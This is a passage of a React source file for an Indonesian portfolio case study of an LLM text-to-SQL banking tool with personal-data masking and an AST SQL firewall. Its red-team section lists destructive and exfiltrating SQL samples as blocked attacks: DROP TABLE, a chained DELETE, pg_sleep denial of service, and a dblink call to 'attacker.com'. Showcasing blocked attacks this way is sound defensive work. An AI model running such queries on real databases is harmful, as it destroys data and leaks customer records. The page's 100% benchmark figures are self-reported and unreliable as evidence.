                      <li><strong>Gate 2 (Tampilan Visual Frontline):</strong> Dataframe di layar pengguna disajikan dengan teknik pseudonimisasi visual (contoh: NIK disamarkan menjadi <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">340401******0001</code> dan nama diubah menjadi <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">[NASABAH_01]</code>).</li>
                      <li>Dilengkapi pencatatan log audit akses berstandar ISO 27001 untuk setiap aksi kueri.</li>
                    </ul>
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Mekanisme: Double-Gated Dataframe Sanitization</span>
                    <span className="font-semibold text-neutral-900">Zero Unmasked PII at Rest</span>
                  </div>
                </div>

              </div>
            </section>

            {/* ======================================================== */}
            {/* SECTION 3: CODE IMPLEMENTATION                           */}
            {/* ======================================================== */}
            <section id="code-implementation" className="space-y-6 scroll-mt-10">
              <h2 className="text-2xl font-bold tracking-tight text-zinc-950 border-b border-zinc-200 pb-3">
                03. Implementasi Produksi Kompiler AST & Privacy Vault
              </h2>
              <p>
                Berikut potongan kode produksi yang mengimplementasikan kelima lapisan proteksi secara deterministik:
              </p>

              <div className="space-y-4">
                <CodeBlock
                  filename="sentra-safequery/security/pii_shield.py"
                  language="python"
                  code={codeLayer1}
                />

                <CodeBlock
                  filename="sentra-safequery/compiler/ast_firewall.py"
                  language="python"
                  code={codeLayer3}
                />

                <CodeBlock
                  filename="sentra-safequery/database/parameter_bridge.py"
                  language="python"
                  code={codeLayer4}
                />

                <CodeBlock
                  filename="sentra-safequery/governance/dual_gate_masking.py"
                  language="python"
                  code={codeLayer5}
                />
              </div>
            </section>

            {/* ======================================================== */}
            {/* SECTION 4: RED-TEAM EVALUATION & BENCHMARKS             */}
            {/* ======================================================== */}
            <section id="red-team-evaluation" className="space-y-6 scroll-mt-10">
              <h2 className="text-2xl font-bold tracking-tight text-zinc-950 border-b border-zinc-200 pb-3">
                04. Evaluasi Kuantitatif Tolok Ukur & Uji Red-Teaming
              </h2>
              <p>
                Sistem diuji menggunakan modul pengujian otomatis terhadap <strong className="text-zinc-900 font-semibold">60 skenario kueri ekstrem</strong> yang mencakup pengujian penetrasi keamanan dan kueri analitik riil:
              </p>

              {/* Benchmark Table */}
              <div className="rounded-xl border border-zinc-200 bg-white overflow-hidden shadow-xs my-6">
                <div className="p-4 bg-zinc-50 border-b border-zinc-200 flex items-center justify-between">
                  <span className="text-xs font-mono font-bold uppercase tracking-wider text-zinc-700">
                    Hasil Pengujian Empiris 60 Skenario Kueri
                  </span>
                  <span className="text-[11px] font-mono text-zinc-500">
                    Target: Core Banking Data Mart
                  </span>
                </div>
                
                <div className="overflow-x-auto">
                  <table className="w-full text-left text-xs font-mono">
                    <thead className="bg-zinc-100/70 border-b border-zinc-200 text-zinc-700">
                      <tr>
                        <th className="p-3.5 font-bold">Dimensi Pengujian</th>
                        <th className="p-3.5 font-bold">Cakupan Dataset Uji</th>
                        <th className="p-3.5 font-bold">Nilai Terverifikasi</th>
                        <th className="p-3.5 font-bold text-emerald-800 bg-emerald-50/50">Status Pengujian</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-zinc-200 text-zinc-600">
                      <tr className="hover:bg-zinc-50/50 transition-colors">
                        <td className="p-3.5 font-bold text-zinc-900">Layer 1: PII Zero-Leak Recall</td>
                        <td className="p-3.5">15 Proba PII (NIK, Nama, No. Rek, Telepon)</td>
                        <td className="p-3.5 font-bold text-emerald-700">100.0% Recall</td>
                        <td className="p-3.5 font-bold text-emerald-700 bg-emerald-50/30">15 / 15 Lolos (0 PII Bocor ke LLM)</td>
                      </tr>
                      <tr className="hover:bg-zinc-50/50 transition-colors">
                        <td className="p-3.5 font-bold text-zinc-900">Layer 3: Red-Team Attack Mitigation</td>
                        <td className="p-3.5">15 Vektor Serangan Destruktif (DDL/DML/CTE/DoS)</td>
                        <td className="p-3.5 font-bold text-emerald-700">100.0% Termitigasi</td>
                        <td className="p-3.5 font-bold text-emerald-700 bg-emerald-50/30">15 / 15 Diblokir Kompiler AST</td>
                      </tr>
                      <tr className="hover:bg-zinc-50/50 transition-colors">
                        <td className="p-3.5 font-bold text-zinc-900">Layer 2: Valid SQL Syntax Rate (VSR)</td>
                        <td className="p-3.5">30 Skenario Kueri Bisnis Kompleks (Agregasi, Filter)</td>
                        <td className="p-3.5 font-bold text-emerald-700">100.0% Valid SQL</td>
                        <td className="p-3.5 font-bold text-emerald-700 bg-emerald-50/30">30 / 30 Kueri Tereksekusi Sempurna</td>
                      </tr>
                      <tr className="hover:bg-zinc-50/50 transition-colors">
                        <td className="p-3.5 font-bold text-zinc-900">Database Execution Accuracy (EX)</td>
                        <td className="p-3.5">30 Skenario Kueri Nyata Perbankan</td>
                        <td className="p-3.5 font-bold text-emerald-700">100.0% Akurat</td>
                        <td className="p-3.5 font-bold text-emerald-700 bg-emerald-50/30">Data Valid & Bebas Runtime Crash</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>

              {/* Vektor Serangan Yang Berhasil Dinetralkan */}
              <div className="space-y-3 pt-2">
                <h3 className="text-base font-bold text-zinc-900">
                  Vektor Serangan Red-Team yang Berhasil Dinetralkan oleh AST Firewall:
                </h3>
                <div className="space-y-2 font-mono text-xs">
                  <div className="p-3 bg-red-50/60 border border-red-200/80 rounded-lg flex items-center justify-between">
                    <span className="text-red-900 font-semibold">1. DROP TABLE customers;</span>
                    <span className="text-red-700 text-[11px] font-sans">→ Ditolak oleh Root Statement Assertion</span>
                  </div>
                  <div className="p-3 bg-red-50/60 border border-red-200/80 rounded-lg flex items-center justify-between">
                    <span className="text-red-900 font-semibold">2. WITH deleted AS (DELETE FROM accounts RETURNING *) SELECT * FROM deleted;</span>
                    <span className="text-red-700 text-[11px] font-sans">→ Ditolak oleh Recursive Node Traversal (exp.Delete)</span>
                  </div>
                  <div className="p-3 bg-red-50/60 border border-red-200/80 rounded-lg flex items-center justify-between">
                    <span className="text-red-900 font-semibold">3. SELECT * FROM accounts; DROP TABLE transactions;</span>
                    <span className="text-red-700 text-[11px] font-sans">→ Ditolak oleh Statement Chaining Detector</span>
                  </div>
                  <div className="p-3 bg-red-50/60 border border-red-200/80 rounded-lg flex items-center justify-between">
                    <span className="text-red-900 font-semibold">4. SELECT pg_sleep(15);</span>
                    <span className="text-red-700 text-[11px] font-sans">→ Ditolak oleh Function Blacklist Engine</span>
                  </div>
                  <div className="p-3 bg-red-50/60 border border-red-200/80 rounded-lg flex items-center justify-between">
                    <span className="text-red-900 font-semibold">5. SELECT dblink('host=attacker.com', 'SELECT * FROM customers');</span>
                    <span className="text-red-700 text-[11px] font-sans">→ Ditolak oleh External Exfiltration Filter</span>
                  </div>
                </div>
              </div>
            </section>

            {/* ======================================================== */}
            {/* SECTION 5: OPERATIONAL IMPACT                            */}
            {/* ======================================================== */}
            <section id="operational-impact" className="space-y-6 scroll-mt-10">
              <h2 className="text-2xl font-bold tracking-tight text-zinc-950 border-b border-zinc-200 pb-3">
                05. Dampak Operasional & Komersial
              </h2>

              {/* Impact Comparison Table */}
              <div className="rounded-xl border border-zinc-200 bg-white overflow-hidden shadow-xs my-6">
                <div className="p-4 bg-zinc-50 border-b border-zinc-200 flex items-center justify-between">
                  <span className="text-xs font-mono font-bold uppercase tracking-wider text-zinc-700">
                    Komparasi Metrik Operasional BI
                  </span>
                  <span className="text-[11px] font-mono text-zinc-500">
                    Sebelum vs Sesudah Sentra-SafeQuery
                  </span>
                </div>
                
                <div className="overflow-x-auto">
                  <table className="w-full text-left text-xs font-mono">
                    <thead className="bg-zinc-100/70 border-b border-zinc-200 text-zinc-700">
                      <tr>
                        <th className="p-3.5 font-bold">Parameter Operasional</th>
                        <th className="p-3.5 font-bold">Alur Kerja BI Konvensional</th>
                        <th className="p-3.5 font-bold">Platform Sentra-SafeQuery</th>
                        <th className="p-3.5 font-bold text-emerald-800 bg-emerald-50/50">Peningkatan Terukur</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-zinc-200 text-zinc-600">
                      <tr className="hover:bg-zinc-50/50 transition-colors">
                        <td className="p-3.5 font-bold text-zinc-900">Waktu Tunggu Laporan Ad-Hoc</td>
                        <td className="p-3.5 text-zinc-500">14 Hari (Tiket IT Central)</td>
                        <td className="p-3.5">&lt; 2.5 Detik</td>
                        <td className="p-3.5 font-bold text-emerald-700 bg-emerald-50/30">Efisiensi Waktu ~99.9%</td>
                      </tr>
                      <tr className="hover:bg-zinc-50/50 transition-colors">
                        <td className="p-3.5 font-bold text-zinc-900">Hambatan Keterampilan Teknis</td>
                        <td className="p-3.5 text-zinc-500">Wajib menguasai sintaks SQL</td>
                        <td className="p-3.5">Bahasa Indonesia sehari-hari</td>
                        <td className="p-3.5 font-bold text-emerald-700 bg-emerald-50/30">100% Inklusif untuk Staf Non-IT</td>
                      </tr>
                      <tr className="hover:bg-zinc-50/50 transition-colors">
                        <td className="p-3.5 font-bold text-zinc-900">Risiko Kebocoran PII ke Cloud AI</td>
                        <td className="p-3.5 text-red-600">Risiko Tinggi (Data Mentah)</td>
                        <td className="p-3.5 font-bold text-emerald-700">0% (Tokenisasi Ephemeral)</td>
                        <td className="p-3.5 font-bold text-emerald-700 bg-emerald-50/30">100% Patuh Regulasi UU PDP</td>
                      </tr>
                      <tr className="hover:bg-zinc-50/50 transition-colors">
                        <td className="p-3.5 font-bold text-zinc-900">Risiko Eksekusi Kueri Destruktif</td>
                        <td className="p-3.5 text-red-600">Rentan pada agent LLM biasa</td>
                        <td className="p-3.5 font-bold text-emerald-700">0% Mutasi Basis Data</td>
                        <td className="p-3.5 font-bold text-emerald-700 bg-emerald-50/30">Zero Compromise via AST Guard</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>

              {/* 3 Metric Highlight Cards */}
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                <div className="p-4 rounded-xl border border-zinc-200 bg-white">
                  <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400 mb-1">
                    Waktu Respon Kueri
                  </div>
                  <div className="text-xl font-bold text-zinc-900 font-mono">
                    &lt; 2.5 Detik
                  </div>
                  <div className="text-xs text-zinc-500 mt-1">
                    vs 14 hari waktu tunggu tiket tim data pusat
                  </div>
                </div>

                <div className="p-4 rounded-xl border border-zinc-200 bg-white">
                  <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400 mb-1">
                    Preservasi Privasi (UU PDP)
                  </div>
                  <div className="text-xl font-bold text-emerald-700 font-mono">
                    0% PII Leakage
                  </div>
                  <div className="text-xs text-zinc-500 mt-1">
                    100% recall proteksi NIK, rekening & nama
                  </div>
                </div>

                <div className="p-4 rounded-xl border border-zinc-200 bg-white">
                  <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400 mb-1">
                    Pencegahan Mutasi
                  </div>
                  <div className="text-xl font-bold text-purple-700 font-mono">
                    100% Zero-Mutation
                  </div>
                  <div className="text-xs text-zinc-500 mt-1">
                    Seluruh vektor serangan DDL/DML/DoS diblokir
                  </div>
                </div>
              </div>
            </section>

            {/* ======================================================== */}
            {/* SECTION 6: ENGINEERING TAKEAWAYS                         */}
            {/* ======================================================== */}
            <section id="takeaways" className="space-y-6 scroll-mt-10">
              <h2 className="text-2xl font-bold tracking-tight text-zinc-950 border-b border-zinc-200 pb-3">
                06. Ringkasan Rekayasa & Relevansi Industri Perbankan
              </h2>
              <p>
                Pembangunan Sentra-SafeQuery ini menghasilkan tiga kesimpulan arsitektur utama untuk ekosistem AI perbankan berisiko tinggi:
              </p>

              {/* Takeaways Stack Cards */}
              <div className="space-y-4 my-6">
                
                {/* TAKEAWAY 1 */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Prinsip 01 // Compiler-Grade Security
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5 flex items-center gap-2">
                        <Terminal className="w-4 h-4 text-purple-600" />
                        Keamanan LLM Tingkat Kompiler (AST Parsing)
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-neutral-100 text-neutral-700 border border-neutral-200/60 whitespace-nowrap">
                      Beyond Regex Filter
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Membuktikan bahwa filtrasi berbasis regex sederhana tidak memadai untuk sistem perbankan berisiko tinggi. Parsing pohon sintaksis (AST) menggunakan <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">sqlglot</code> adalah standar minimum mutlak untuk memvalidasi dan mengendalikan luaran SQL model AI dari ancaman injeksi terselubung.
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Hasil: Eliminasi Manipulasi Destruktif</span>
                    <span className="font-semibold text-neutral-900">Deterministic Structural Validation</span>
                  </div>
                </div>

                {/* TAKEAWAY 2 */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Prinsip 02 // Regulatory Architecture
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5 flex items-center gap-2">
                        <ShieldCheck className="w-4 h-4 text-emerald-600" />
                        Kepatuhan Privasi Berbasis Desain (Privacy by Design)
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-neutral-100 text-neutral-700 border border-neutral-200/60 whitespace-nowrap">
                      UU PDP No. 27/2022
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Mengintegrasikan mandat hukum UU PDP No. 27/2022 secara langsung ke dalam arsitektur teknis melalui tokenisasi dinamis <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">SessionVault</code> dan mekanisme pengamanan ganda (<em>dual-gate outbound masking</em>) yang menjamin kerahasiaan data nasabah tanpa mengorbankan utilitas analitik.
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Hasil: Kepatuhan Hukum Perbankan</span>
                    <span className="font-semibold text-neutral-900">Zero PII Leakage Guarantee</span>
                  </div>
                </div>

                {/* TAKEAWAY 3 */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Prinsip 03 // Domain Empowerment
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5 flex items-center gap-2">
                        <KeyRound className="w-4 h-4 text-blue-600" />
                        Penyelarasan Domain Bahasa Operasional Lapangan
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-neutral-100 text-neutral-700 border border-neutral-200/60 whitespace-nowrap">
                      Frontline Inclusion
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Menghubungkan intuisi komersial staf operasional garis depan (Mantri Bank) dengan sistem data warehousing perbankan tanpa mengharuskan mereka mempelajari sintaks SQL yang kompleks, meningkatkan kecepatan pengambilan keputusan bisnis mikro secara eksponensial.
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Hasil: Demokratisasi Data Frontline</span>
                    <span className="font-semibold text-neutral-900">Immediate Ad-Hoc Commercial Insights</span>
                  </div>
                </div>

              </div>

              {/* Back to Home Action Footer */}
              <div className="pt-8 border-t border-neutral-200 flex items-center justify-between">
                <Link
                  href="/#selected-work"
                  className="inline-flex items-center gap-2 text-xs font-mono font-semibold text-neutral-900 hover:text-neutral-600 transition-colors"
                >
                  <ArrowLeft className="w-3.5 h-3.5" />
                  <span>Kembali ke Ringkasan Portofolio</span>
                </Link>
                <a
                  href="#bottlenecks"
                  className="text-xs font-mono text-neutral-400 hover:text-neutral-700 transition-colors"
                >
                  Back to Top ↑
                </a>
              </div>
            </section>

          </article>
        </div>
      </main>
    </div>
  );
}
